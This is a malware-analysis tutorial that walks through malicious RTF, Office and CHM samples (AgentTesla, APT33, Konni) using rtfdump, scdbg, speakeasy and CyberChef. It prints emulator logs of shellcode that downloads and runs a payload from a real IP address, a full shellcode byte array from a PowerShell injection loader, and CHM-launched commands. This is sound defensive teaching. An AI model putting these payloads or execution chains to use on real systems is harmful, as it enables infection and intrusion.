| `MD5 Hash` | 5DC44B9CA9E7CE8958B2B6F36CC06EBD |
| `Malware family` | AgentTesla |

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **RTF Dump**: `C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py`
- **Format-Bytes**: `C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\format-bytes.py`
- **XORSearch**: `c:\Tools\MalDoc\Office\Tools\DidierStevensSuite\XORSearch.exe`
- **scdbg**: `c:\Tools\MalDoc\Office\Tools\scdbg\scdbg.exe`
- **speakeasy**: `speakeasy` is another shellcode debugger. This is added in environment variables.
- **HTB Sample RTF File**: `C:\Tools\MalDoc\Office\Demo\Samples\rtf\demo\HTB-Sample.rtf`
- **AgentTesla RTF File**: `C:\Tools\MalDoc\Office\Demo\Samples\AgentTesla\rtf\payload_1.doc`

* * *

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

The file name has the extension `.doc`, but if we check using `HxD` or `Trid`, we can clearly see it is an RTF file. This is commonly done by threat actors to open this through the MS Word.

```cmd-session
C:\> trid C:\Tools\MalDoc\Office\Demo\Samples\AgentTesla\rtf\payload_1.doc

```

![rtf-analysis](P13OARSIx7oG.png)

For the analysis of RTF files, we can use `rtfdump.py` (written by Didier Stevens). Let's check with RTF Dump now to see if there are any objects present.

```cmd-session
C:\> python c:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\AgentTesla\rtf\payload_1.doc

```

![rtf-analysis](xPr0yiilcVYr.png)

The screenshot above shows the presence of an object in this RTF document. We can view the object in hex using `-s 4` to select object 4 (i.e., `\*\objupdate53415341`). The `-H` is used to display the output in hex format.

```cmd-session
C:\> C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\AgentTesla\rtf\payload_1.doc -s 4 -H | more

```

![rtf-analysis](xZRHQhpwq2JX.png)

In this output, we can see the keyword `equAtIOn.3`. This keyword refers to the [Microsoft Equation Editor](https://support.office.com/en-us/article/Equation-Editor-6eac7d71-3c74-437b-80d3-c7dea24fdf3f), which is a Microsoft Office component that used to contain a vulnerability (CVE-2017-11882) enabling remote code execution on a vulnerable target system. There are many malware samples present that have exploited this vulnerability. In almost all cases for this vulnerability, there is shellcode in this object.

There's a tool called `format-bytes.py` by Didier Stevens, which decomposes structured binary data using format strings. It's stored in a specific directory. Let's change to the `C:\Tools\MalDoc\Office\Tools\DidierStevensSuite` directory.

```cmd-session
C:\> cd C:\Tools\MalDoc\Office\Tools\DidierStevensSuite

```

Now, let's use `format-bytes.py` to see if it provides any useful information. We can execute this tool using the following command:

```cmd-session
C:\Tools\MalDoc\Office\Tools\DidierStevensSuite> python rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\AgentTesla\rtf\payload_1.doc -s 4 -d | python format-bytes.py -f name=eqn1

```

A library of format strings is added in the tool `format-bytes.py`, and `eqn1` is the format string to use for this exploit.

![rtf-analysis](XTFQJeYO1Bpu.png)

The output consists of a combination of integers and byte sequences. Each line corresponds to a distinct component of the stream or object within the RTF file. However, there are several noteworthy observations:

- The line (line number 9) with `Start MTEF header` suggests that the analysis found a MathType Equation File (MTEF) header, which is commonly embedded in documents as part of mathematical equations.
- Bytes ( `<class 'bytes'>`) indicates a sequence of bytes, which might be part of an embedded object or shellcode.
- The `Shellcode/Command (fontname)` suggests that the embedded object might contain shellcode or a command disguised as a font name, a common technique used in malicious documents.

This object seems to contain shellcode which we need to analyze.

First, let's dump this object with shellcode into a file that we can analyze later. To dump the shellcode, we'll use the `--dump` option with the `--hexcode` format.

```cmd-session
C:\> python c:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\AgentTesla\rtf\payload_1.doc --select 4 --hexdecode --dump > c:\temp\agenttesla_rtf.sc

```

![rtf-analysis](guOnB6s3KVKJ.png)

Now, the shellcode is saved in the file `c:\temp\agenttesla_rtf.sc`. To analyze the shellcode, we can use a shellcode emulator such as `scdbg.exe`. If we run this directly in the shellcode emulator, it will throw an error, as shown in the screenshot below.

```cmd-session
C:\> C:\Tools\MalDoc\Office\Tools\scdbg\scdbg.exe /f c:\temp\agenttesla_rtf.sc

```

![rtf-analysis](eoBWZUfhireJ.png)

This error is normal because this is an object that we dumped, and the shellcode entry doesn't start from the beginning of this object. We need to provide the shellcode entry point to `scdbg.exe`. After that, we can emulate the shellcode.

## Identify shellcode Entry

We need to find the entry point of the shellcode. Once we find the entry of shellcode, we can emulate the shellcode execution from the entrypoint to understand what API calls are made. The simplest way to find shellcode entry point is by using `XORSearch` utility.

`XORSearch` is another tool from the DidierStevensSuite that allows us to search for strings and embedded PE files by brute-forcing different encodings. One of the features of XORSearch is shellcode detection, which is possible using its engine that employs rules to detect shellcode artifacts. Refer to [this](https://blog.didierstevens.com/2014/09/29/update-xorsearch-with-shellcode-detector/) blog post from Didier Stevens to learn more about these rules.

To use these shellcode wildcard rules with XORSearch, we use options `-w` or `-W`. `-w` allows us to specify our own rule(s), `-W` uses the built-in rules.

```cmd-session
C:\> C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\XORSearch.exe -W c:\temp\agenttesla_rtf.sc

```

![rtf-analysis](5NCICFFMSY3o.png)

We are using XORSearch to analyze the shellcode, and have found multiple instances of `GetEIP` using various XOR and ROT (rotation) methods. `GetEIP` is a common technique used in shellcode to determine the current instruction pointer, which is often used in exploits.

In this scenario, XORSearch gives us many positions of the `GetEIP` method used within the shellcode. If we specify these positions in the shellcode emulator, it should work with any of the positions. Let's try with any of the first four different offsets in this shellcode, (i.e., `00000372`, `00000376`, `000003AF`, and `00000409`).

## Shellcode Emulation using SCDBG

We'll try these offsets in the shellcode emulator again using the `/foff` offset flag. Let's start the shellcode emulator again with the first rule triggered by XORSearch, i.e., offset `00000372`.

```cmd-session
C:\> C:\Tools\MalDoc\Office\Tools\scdbg\scdbg.exe /f c:\temp\agenttesla_rtf.sc /foff 372

```

![rtf-analysis](OOBCY8SchEdy.png)

The offset worked and `scdbg.exe` was able to emulate the shellcode successfully. From the output, we can see that the provided shellcode is designed to:

- Downloads a malicious file from a remote server.
- Save the file to the `%APPDATA%` directory on the local system.
- Execute the downloaded file to further propagate the attack.

Let's break this down and understand it in detail.

The execution starts at file `offset 372`, corresponding to the address `0x401372`. The shellcode makes several API calls to carry out its malicious actions. The first `ExpandEnvironmentStringsW(%APPDATA%\winiti.exe, dst=12fbd8, sz=104)` call expands the environment variable `%APPDATA%` to determine the path where the malicious executable `winiti.exe` will be saved.

The `LoadLibraryW(UrlMon)` call loads the UrlMon library, which is required for downloading files from the internet.

Next function is `GetProcAddress(URLDownloadToFileW)`, which retrieves the address of the URLDownloadToFileW function. Another function is `URLDownloadToFileW(http://107.172.4.179/656/winiti.exe, C:\Users\Administrator\AppData\Roaming\winiti.exe)` which downloads the malicious executable winiti.exe from the specified URL and saves it to the AppData directory.

Then the shell32 library is loaded, which contains functions for shell operations. The `ShellExecuteW()` function is used to execute the downloaded file to further propagate the attack.

## Shellcode Emulation using SpeakEasy

The shellcode emulation can also be done using another tool - [speakeasy](https://github.com/mandiant/speakeasy) developed by Mandiant.

We'll provide the same offset to speakeasy using the option `-r --raw_offset 372`. This can be executed using the command below:

```cmd-session
C:\>speakeasy -t c:\temp\agenttesla_rtf.sc -r -a x86 -r --raw_offset 372

* exec: shellcode

0x15e4: 'kernel32.GetProcAddress(0x77000000, "ExpandEnvironmentStringsW")' -> 0xfeee0000
0x161f: 'kernel32.ExpandEnvironmentStringsW("%APPDATA%\\winiti.exe", "%APPDATA%\\winiti.exe", 0x104)' -> 0x14
0x1634: 'kernel32.LoadLibraryW("UrlMon")' -> 0x54500000
0x164f: 'kernel32.GetProcAddress(0x54500000, "URLDownloadToFileW")' -> 0xfeee0001
0x16a9: 'urlmon.URLDownloadToFileW(0x0, "http://107.172.4.179/656/winiti.exe", "%APPDATA%\\winiti.exe", 0x0, 0x0)' -> 0x0
0x16c0: 'kernel32.LoadLibraryW("shell32")' -> 0x69000000
0x16d6: 'kernel32.GetProcAddress(0x69000000, "ShellExecuteW")' -> 0xfeee0002
0x16e7: 'shell32.ShellExecuteW(0x0, 0x0, "%APPDATA%\\winiti.exe", 0x0, 0x0, 0x1)' -> 0x21
0x16fb: 'kernel32.GetProcAddress(0x77000000, "ExitProcess")' -> 0xfeee0003
0x16ff: 'kernel32.ExitProcess(0x0)' -> 0x0
* Finished emulating

```

This also shows the output similar to `scdbg.exe` including the Windows API functions and suspicious URL as shown in the screenshot below.

![rtf-analysis](mIHrRZhqpoea.png)

To summarize, we first extracted the suspicious object, namely the shellcode. Subsequently, we were able to identify and extract the Indicators of Compromise (IOCs) from this shellcode.


# Analysis Using CyberChef

## Introduction

CyberChef is a web-based tool that provides a wide array of operations for encryption, encoding, compression, and data analysis. It is often referred to as the `Cyber Swiss Army Knife` because of its versatility in handling various data manipulation and analysis tasks. CyberChef is popular among security researchers, penetration testers, and anyone needing to process and analyze data in various formats.

CyberChef can be accessed at the following URL - [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

![](drzfn0IA02rH.png)

## How Does It Work?

CyberChef operates through a simple drag-and-drop interface where users can chain together multiple operations to process data. Users input data (e.g., text, hex, binary) and select from a large list of operations (e.g., base64 encoding, hex decoding, XOR encryption, etc.). The output of each operation can be passed as input to the next, creating a pipeline that can handle complex data transformations.

CyberChef UI has the following components:

- The `Operations` (located on the left sidebar) area is where we can browse and select from a wide array of operations that CyberChef supports. These operations are organized into categories, such as Encoding, Encryption, Compression, Data Format, and more.
  - `Usage`: We can search for specific operations using the search bar or explore the categories to find the one we need. Once found, we can drag and drop the operation into the "Recipe" area.
- The `Recipe` (located on the center panel) area is where we build our data transformation pipeline. It’s a sequence of operations that we apply to our input data.
  - `Usage`: After dragging an operation from the "Operations" sidebar, we drop it into the Recipe area. We can then configure the operation's parameters (if necessary) and arrange the order of operations. The recipe will execute the operations in the order they appear, and we can see the live result as each operation is applied.
- The `Input` (located on the bottom left panel) is where we paste or type the data we want to process. The input can be in various formats, such as text, hexadecimal, binary, or Base64.
  - `Usage`: Enter our raw data here, which will then be processed by the operations in the Recipe. The input panel can also be toggled to accept file uploads or to view data in different encoding formats.
- The `Output` panel (located on the bottom right panel) displays the result of the operations applied to the input data via the Recipe.
  - `Usage`: As we add and modify operations in the Recipe, the output is automatically updated to reflect the current state of the data. We can view the output in different formats and export it if needed.

![](oNXFg1rif8nG.png)

There is also a toolbar located at the top of the interface. It provides options to save or load recipes, clear the current recipe, and access settings or help documentation.

We can use as many operations as we like in simple or complex ways. Some examples are as follows:

- [Decode a Base64-encoded string](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=VTI4Z2JHOXVaeUJoYm1RZ2RHaGhibXR6SUdadmNpQmhiR3dnZEdobElHWnBjMmd1)

- [Convert data from a hexdump, then decompress](https://gchq.github.io/CyberChef/#recipe=From_Hexdump()Gunzip()&input=MDAwMDAwMDAgIDFmIDhiIDA4IDAwIDEyIGJjIGYzIDU3IDAwIGZmIDBkIGM3IGMxIDA5IDAwIDIwICB8Li4uLi6881cu/y7HwS4uIHwKMDAwMDAwMTAgIDA4IDA1IGQwIDU1IGZlIDA0IDJkIGQzIDA0IDFmIGNhIDhjIDQ0IDIxIDViIGZmICB8Li7QVf4uLdMuLsouRCFb/3wKMDAwMDAwMjAgIDYwIGM3IGQ3IDAzIDE2IGJlIDQwIDFmIDc4IDRhIDNmIDA5IDg5IDBiIDlhIDdkICB8YMfXLi6%2BQC54Sj8uLi4ufXwKMDAwMDAwMzAgIDRlIGM4IDRlIDZkIDA1IDFlIDAxIDhiIDRjIDI0IDAwIDAwIDAwICAgICAgICAgICB8TshObS4uLi5MJC4uLnw)

- [Decrypt and disassemble shellcode](https://gchq.github.io/CyberChef/#recipe=From_Hexdump()Gunzip()&input=MDAwMDAwMDAgIDFmIDhiIDA4IDAwIDEyIGJjIGYzIDU3IDAwIGZmIDBkIGM3IGMxIDA5IDAwIDIwICB8Li4uLi6881cu/y7HwS4uIHwKMDAwMDAwMTAgIDA4IDA1IGQwIDU1IGZlIDA0IDJkIGQzIDA0IDFmIGNhIDhjIDQ0IDIxIDViIGZmICB8Li7QVf4uLdMuLsouRCFb/3wKMDAwMDAwMjAgIDYwIGM3IGQ3IDAzIDE2IGJlIDQwIDFmIDc4IDRhIDNmIDA5IDg5IDBiIDlhIDdkICB8YMfXLi6%2BQC54Sj8uLi4ufXwKMDAwMDAwMzAgIDRlIGM4IDRlIDZkIDA1IDFlIDAxIDhiIDRjIDI0IDAwIDAwIDAwICAgICAgICAgICB8TshObS4uLi5MJC4uLnw)


Check this [guide](https://github.com/gchq/CyberChef/blob/master/README.md) for more details.

## Analysis

We'll perform the analysis of a malicious document using CyberChef. The details are below:

| Name | Description |
| --- | --- |
| File Name | cv\_itworx.doc |
| MD5 Hash | 45b0e5a457222455384713905f886bd4 |
| Malware family | APT33 |

The screenshot below shows what the document looks like when we open it in Word or OpenOffice.

![cyberchef](ApIRHRAteEFf.png)

Here's the link to [VirusTotal](https://www.virustotal.com/gui/file/528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62/details) for this sample.

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **speakeasy**: `speakeasy` is another shellcode debugger. This is added in environment variables. Simply type `speakeasy` in command prompt and provide the shellcode file path.
- **CyberChef**: `C:\Tools\cyberchef\cyberchef.html`
- **Malicious Document (APT33)**: `C:\Tools\MalDoc\Office\Demo\Samples\cyberchef\apt33\cv_itworx.doc`

* * *

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

A local version of CyberChef is available on the target (VM) at the location mentioned above. Just open the `cyberchef.html` file in the browser, then drag and drop the sample directly into the input section of CyberChef.

![cyberchef](FC978sboDhng.gif)

Now we can see the raw bytes of the file.

![cyberchef](MxutqkYmGNaR.png)

Let's start by performing a strings search using CyberChef.

![cyberchef](8ItxX2PixuqA.gif)

Now we have some plain text paragraphs, but we also have some encoded text that looks like Base64.

![](uByT4dWUhLtR.png)

Let's try to decode this in CyberChef. To do that, we'll copy and paste it into a new CyberChef input tab and add the Base64 operation.

![](DVoWkWDPWtJc.gif)

Upon analysis, a URL of a suspicious nature has been identified within the macro content, warranting further investigation.

![](djRqCwcLD6vJ.png)

If this code is executed, it will run `powershell.exe` in a hidden window and download another malicious file or script by connecting to the attacker-controlled IP address and port.

Let's move to another encoded string.

![](r3UCy7354kkJ.png)

The script begins by defining a string `$Qsc`, which contains a PowerShell script. This script is then Base64 encoded. The next part of this script, `$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Qsc));`, encodes the `$Qsc` string into Base64 format.

Then the script uses PowerShell's `Add-Type` cmdlet to define several Windows API functions from `kernel32.dll` and `msvcrt.dll`. These include:

- `VirtualAlloc`: Allocates memory in the process's address space.
- `CreateThread`: Creates a new thread in the process.
- `memset`: Fills a block of memory with a specific value.

These functions are combined into a PowerShell object `$w`. Then the script defines a byte array `$z`, which likely contains `shellcode`. This shellcode is injected into the memory allocated by `VirtualAlloc`.

The `memset` function is used to copy each byte of the shellcode into the allocated memory. The function `CreateThread` is then used to execute the shellcode by creating a new thread that starts at the memory address where the shellcode was injected.

The next very important part is to see what is inside the shellcode. First, we need to extract the shellcode from the PowerShell script. The shellcode in this script is stored in a byte array `$z` and looks like this:

```shellcode
[Byte[]]$z = 0xdb,0xcd,0xd9,0x74,0x24,0xf4,0xba,0x62,0x93,0xaf,0x6c,0x5e,0x31,0xc9,0xb1,0x57,0x31,0x56,0x18,0x83,0xee,0xfc,0x03,0x56,0x76,0x71,0x5a,0x90,0x9e,0xf7,0xa5,0x69,0x5e,0x98,0x2c,0x8c,0x6f,0x98,0x4b,0xc4,0xdf,0x28,0x1f,0x88,0xd3,0xc3,0x4d,0x39,0x60,0xa1,0x59,0x4e,0xc1,0x0c,0xbc,0x61,0xd2,0x3d,0xfc,0xe0,0x50,0x3c,0xd1,0xc2,0x69,0x8f,0x24,0x02,0xae,0xf2,0xc5,0x56,0x67,0x78,0x7b,0x47,0x0c,0x34,0x40,0xec,0x5e,0xd8,0xc0,0x11,0x16,0xdb,0xe1,0x87,0x2d,0x82,0x21,0x29,0xe2,0xbe,0x6b,0x31,0xe7,0xfb,0x22,0xca,0xd3,0x70,0xb5,0x1a,0x2a,0x78,0x1a,0x63,0x83,0x8b,0x62,0xa3,0x23,0x74,0x11,0xdd,0x50,0x09,0x22,0x1a,0x2b,0xd5,0xa7,0xb9,0x8b,0x9e,0x10,0x66,0x2a,0x72,0xc6,0xed,0x20,0x3f,0x8c,0xaa,0x24,0xbe,0x41,0xc1,0x50,0x4b,0x64,0x06,0xd1,0x0f,0x43,0x82,0xba,0xd4,0xea,0x93,0x66,0xba,0x13,0xc3,0xc9,0x63,0xb6,0x8f,0xe7,0x70,0xcb,0xcd,0x6f,0xe9,0xb1,0x99,0x6f,0x9d,0x4e,0x0b,0x01,0x34,0xe5,0xa3,0x91,0xb1,0x23,0x33,0xd6,0xeb,0x1d,0xe0,0x7b,0x47,0x0d,0x45,0x28,0x0f,0x8b,0x3f,0xb7,0x68,0x14,0x6a,0x14,0x24,0x81,0x96,0xc9,0x99,0x3d,0xc2,0xfc,0x1d,0xbe,0x1c,0x72,0x1d,0xbe,0xdc,0xa5,0x2e,0xc9,0xec,0xf6,0x78,0x35,0x5d,0x60,0xd2,0xbc,0xc2,0xb6,0x23,0x6b,0x75,0xf0,0x8f,0xfc,0x86,0xce,0xcf,0x79,0xd5,0x7d,0x43,0xd5,0x89,0xd7,0x0b,0x32,0x78,0xf9,0xf0,0x3b,0x56,0x93,0x6d,0xce,0x06,0xf3,0xf1,0xfd,0xb8,0x03,0x7b,0xe1,0xd3,0x07,0x2b,0x88,0x3c,0x51,0xa3,0x39,0x05,0xc3,0xb5,0x3d,0x5c,0xa8,0xea,0x92,0x0c,0x18,0x65,0x38,0xb5,0xbc,0x0e,0xbd,0x6c,0x39,0x30,0x34,0x85,0x0e,0xc4,0x6e,0xf1,0x60,0x93,0x33,0x54,0x7f,0x09,0x59,0x19,0x17,0xb2,0x8e,0x99,0xe7,0xda,0xae,0x99,0xa7,0x1a,0xfc,0xf1,0x7f,0xbf,0x51,0xe7,0x80,0x6a,0xc6,0xb4,0x2d,0x1c,0x0e,0x6d,0xb9,0x1e,0xf1,0x92,0x39,0x4c,0xa7,0xfa,0x2b,0xe4,0xce,0x19,0xb4,0xdd,0x54,0x1d,0x3e,0x13,0xdd,0x99,0xbf,0x68,0x67,0x65,0xca,0x8b,0x30,0xa5,0x6b,0xbc,0xb4,0xd6,0x6c,0xc3,0x03,0x1c,0xbc,0x0b,0x5a,0x70,0xf1,0x41,0x9a,0xa2,0xc0,0x93,0xef,0xba;

```

## Shellcode Analysis

We'll copy it and paste it into another CyberChef tab. Then we can decode these bytes using the "From Hex" operation in CyberChef. By doing this, the commas `,` and `0x` are recognized and understood by CyberChef.

![](WK0hrrtJkWLo.png)

At this point, we don't know whether it is valid shellcode because the output shows just junk data. We need to validate whether the decoded content is shellcode. If it were simple shellcode, we might have seen some plaintext values such as IP addresses, domain names, Windows API names, etc., but they are not available here. So we need to perform further analysis.

CyberChef has an operation called "Disassemble x86" which can help in disassembling the bytes. We'll convert the values to hex and then use the `Disassemble x86` operation in CyberChef. This is how it looks:

![](4cdgsf2NbnWo.png)

It has some interesting instructions such as XOR and NOP. It looks like shellcode, but we still need to validate it. The best way is to execute it. Let's try to save it into a file and debug it using scdbg.

The extracted shellcode is subsequently stored in a binary file named `shellcode.bin` for further analysis.

![](7yEu6XN91adX.png)

We can use the [SpeakEasy](https://github.com/mandiant/speakeasy) tool from Mandiant. Check out the GitHub [repository](https://github.com/mandiant/speakeasy) for more information.

The `SpeakEasy` tool should be executed with the following options:

- `-t` \- Target (Path to input file to emulate)
- `-r` \- Attempt to emulate file as-is with no parsing (e.g. shellcode)
- `-a x86` \- Force x86 architecture to use during emulation

![cyberchef](mOVZPSOSgeao.png)

We can see similar output from Scdbg:

```cmd-session
C:\Tools\MalDoc\Office\Tools\scdbg\scdbg.exe /f c:\temp\cyberchef\shellcode.bin

```

![cyberchef](tUalrOwU15V7.png)

Now, we have validated that it is shellcode, and we also have a new IOC, i.e., the malicious IP address. We can use VirusTotal to perform a further analysis, showcasing a match with a command and control server.

![](aSTMhqwqTEoF.png)


# CHM Internals

## Introduction

[Compiled HTML](https://en.wikipedia.org/wiki/Microsoft_Compiled_HTML_Help) (CHM) files are commonly used as Microsoft help files. Microsoft Compiled HTML Help is a Microsoft proprietary online help format consisting of HTML pages, index, and navigation tools. The associated files are compressed and deployed in a special format with the extension '.chm' for Compiled HTML. This is an obsolete file format, not widely used anymore. However, threat actors abuse this file type to deploy malware on target systems.

CHM files contain a collection of HTML documents, images, scripts, and other resources compiled into a single file. The generated CHM file is relatively small in size, allowing it to be easily distributed with software packages.

HTML Help Workshop is a comprehensive suite of applications designed for the creation of Compiled HTML Help (CHM) files. While the official Microsoft download [link](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-downloads) is no longer functional, an archive version of the Workshop suite can be accessed via [this alternative resource](https://learn.microsoft.com/en-us/answers/questions/265752/htmlhelp-workshop-download-for-chm-compiler-instal). This help development tool provides an easy-to-use system for creating and managing help projects and their related files:

Here's an example of how a CHM file looks:

![CHM](XHUW9k9unfPT.png)

## CHM File Structure

The structure of a CHM file includes several key components, which are organized in a specific way to allow efficient storage and retrieval of information.

### Key Components of a CHM File

- `ITSF Header (Info-Tech Storage Format)`
- `Directory Header (ITSP)`
- `Directory Index`
- `Content Sections`
- `Data Segments`

When examining the binary data of a CHM file using a Hex Viewer, we can observe several key components that confirm its structure. The file begins with the signature `ITSF` (hexadecimal: `49 54 53 46`). ITFS stands for 'Info-Tech Storage Format', the internal name Microsoft uses for the generic storage file format of CHM files.

This signature is located at the very start of the file and identifies it as a CHM (Compiled HTML) file. After the signature, next is the version number (4 bytes). For a valid CHM file, this should be 3 (hexadecimal: 03). This is located at offset 4.

The next is the Header size which represents the total size of the initial header indicated by a 4-byte integer at offset 8. This is stored in little-endian format. In this example, the header size is 96 bytes, represented as `60 00 00 00` in hexadecimal.

Following the initial header, we find Header Section 0. This section starts with the signature `0xFE 0x01`, which helps in identifying the beginning of the header section within the file structure.

The total size of the CHM file is indicated at offset 8 within the Header Section 0 (or offset `0x68` from the beginning of the file). This is stored in little-endian format. In the given example, the total file size is 1,62,470 bytes.
Hexadecimal representation: `6B 70 0C` (which translates to `0x000C706B` in decimal).

The diagram below shows an overview of the CHM file header:

![CHM](0qb3JiXfmigk.png)

The ITSF header is located at the beginning of the CHM file and contains metadata about the file. Then, there is also the ITSP header, which provides information about the directory structure within the CHM file. The directory index contains references to the content and data sections of the CHM file. It helps locate the various parts of the file quickly. Content sections contain the actual HTML pages, images, scripts, and other files that make up the help documentation. Data segments are compressed blocks of data that store the actual content of the CHM file. They are referenced by the directory index and decompressed as needed.

Detailed structure can be seen [here](https://github.com/corkami/pics/blob/master/binary/chm.png).

## Attack Vectors

While designed for legitimate purposes, attackers have found ways to embed malicious payloads within CHM files. These files can be executed using `HH.exe`, a Microsoft Windows utility for displaying help files. This technique is often used by adversaries to evade antivirus software and application blacklisting mechanisms.

Attackers exploit CHM files by embedding malicious scripts or executable payloads. When the CHM file is opened with HH.exe, the embedded payload can be executed, leading to system compromise. This method is particularly effective because CHM files are often perceived as benign help documents, allowing them to bypass security measures.

[MITRE](https://attack.mitre.org/) has documented this [technique](https://attack.mitre.org/techniques/T1218/001/) under technique ID `T1218.001`, i.e., System Binary Proxy Execution: Compiled HTML File.

![](HipNEnJ3AwYU.png)

Some examples from the MITRE Technique that demonstrate the usage of this technique by different threat groups are as follows.

![](ObtRy4pX5OrS.png)

## CHM Creation Process

The creation process of a CHM file is shown in the image below. The HHC file contains the Table of Contents (TOC) for a CHM file and is referred to as a sitemap file. The index (.hhk) file is an HTML file that contains the index entries (keywords) for your index. When a user opens the index in a compiled help file or on a web page and clicks a keyword, the HTML file associated with the keyword will open. The Help Project File (HHP) encapsulates information from the HHC, HHK, web pages, and images, and is used to generate a CHM file. The HHP file is fed to the CHM compiler, hhc.exe, to create a CHM file.

![CHM](TfUIlw6q6vcf.png)

Alternatively, we can do this from a GUI application called `hhw.exe` (part of the Workshop suite). It is possible to decompile CHM files using `hhc.exe` (HTML Help Compiler) and `hhw.exe` (HTML Help Workshop). However, this is not a requirement; one can simply use 7-Zip to extract (decompile) all items in the CHM files for the analysis. There is another tool called [keytools](https://keyworks.help-info.de/keytools.htm) that is useful to recover all `.hhc` and `.hhk` files.

When we talk about a specific file type in the context of malware, we are more interested in the code execution aspects. CHM files are simply a well-organized collection of HTML files; therefore, attackers can place malicious JavaScript to gain code execution on the target system. When we analyze such documents, we are interested in uncovering malicious JS code embedded in lengthy HTML pages. We will see this shortly in the following sections. If you want to dive deeper into the internals of CHM, check this unofficial CHM specification [here](https://www.nongnu.org/chmspec/latest/).

* * *

We'll now perform analysis of a Malicious CHM File in the next section. Click on `Mark Complete & Next` to proceed to the next section.


# Malicious CHM Analysis

## Introduction

A Compiled HTML File (CHM) is an HTML file that has been compiled and is executed through a signed proxy, `hh.exe`. This allows the execution of commands, making CHM files a powerful tool when combined with other techniques to perform various malicious actions. These actions can include:

- Using `msiexec` to execute a remote installer.
- Including `Base64` encoded files inside the CHM file.
- Creating persistence on the targeted endpoint.

This technique was first popularized by an Advanced Persistent Threat (APT) group and was soon adopted by various malware families to achieve initial execution on a machine.

The diagram below shows an example of the usage of this technique by a cyber-espionage campaign known as Konni, originating from North Korea.

![CHM](EW6AXydeROVE.png)

### Malicious CHM File (AgentTesla)

We'll perform the analysis of a malicious CHM sample. The details related to the sample are as follows:

| Name | Description |
| --- | --- |
| `File Name` | PaymentConfirmation.chm |
| `MD5 Hash` | 2548d0e05c47c506cf9fd668dace5497 |
| `Malware family` | Konni Campaign |

### Analysis Process

- Extract the items in CHM files using 7-Zip, or we can use `hhc` or `hhw` to achieve the same.

- Analyse the extracted html pages and look for anything suspicious, such as JavaScript code.


### Tools Required

| Tools | Description |
| --- | --- |
| `HTML Help Workshop Tools` | To create/decompile CHM files |
| `7zip` | To extract (decompile) items in the chm files |
| `keyTools` | To decompile chm files (not required) |

* * *

### CHM Analysis

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **Konni Sample**: `C:\Tools\MalDoc\chm\Samples\Konni\paymentconfirmation.chm`
- **HTML Help Workshop**: `C:\Program Files (x86)\HTML Help Workshop\hhw.exe`
- **WinPrefetchView**: `C:\Tools\winprefetchview\WinPrefetchView.exe`
- **AMSIScript**: `C:\Tools\AMSIScript\AMSIScriptContentRetrieval.ps1`
- **PECmd**: `C:\Tools\EZ-Tools\PECmd.exe`

* * *

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

#### Extract Basic Information

Let's start with the HTML Help Workshop GUI tool first. Open `HTML Help Workshop` from the Start Menu (or from the path mentioned above) and go to the File menu. On the File menu, click CHM Information.

![CHM](T54c1utI24MW.png)

Browse to the CHM sample location. Check the "List file names" option.

![CHM](nkzh4kg5CkTp.png)

This will show the basic information related to the files present inside the CHM file.

![CHM](DmFZMl7cbRIQ.png)

#### Decompile CHM File

There are many ways to decompile a help file. Let's start with HTML Help Workshop GUI tool first.

In the Destination folder box, enter the name of the folder where we want the decompiled files to be copied. In the Compiled help file box, enter the name of the compiled help (.chm) file we want to decompile.

![CHM](ZuXCoHLvMvxq.png)

We can see the files decompiled and saved in the specified destination directory.

![CHM](nPINb64kzXGx.png)

> **Note:** We could directly use 7-Zip to extract all these files as well. Also, "hh.exe" can be used to decompile chm files by providing " `-decompile`" switch.

There are some interesting files like `.bat` and `.vbs` scripts present.

### Analysis of extracted files

We'll analyze these extracted files now. As the execution in CHM files starts from `HTML` pages, let's examine the contents of 'index.html.' The HTML code is shown in the screenshot below. We can see two interesting objects with IDs 'r' and 'f.' The object with ID 'f' is in the script block, stored in the variable 'value1.' The 'Item1' parameters of both objects hold system commands.

The code `f.Click()` simulates a click, executing the command in object "f". This means when the user opens the document, it executes `,hh,-decompile C:\\Users\\Public\\Libraries '+d+'"`. This will simply decompile the document and dump the items in the `.chm` file in `C:\Users\Public\Libraries` directory. The `.bat` files and `.vbs` file will be saved to Libraries directory. After the decompilation, the document proceeds to execute the command `cmd,/c start /min cscript C:\Users\Public\Libraries\emlmanager.vbs` by simulating another click by running "r.Click()". This is executed after a delay of 2000 milliseconds. The " `emlmanager.vbs`" script will set the infection chain in action.

![CHM](zGekHny4Qcke.png)

#### Analyzing emlmanger.vbs

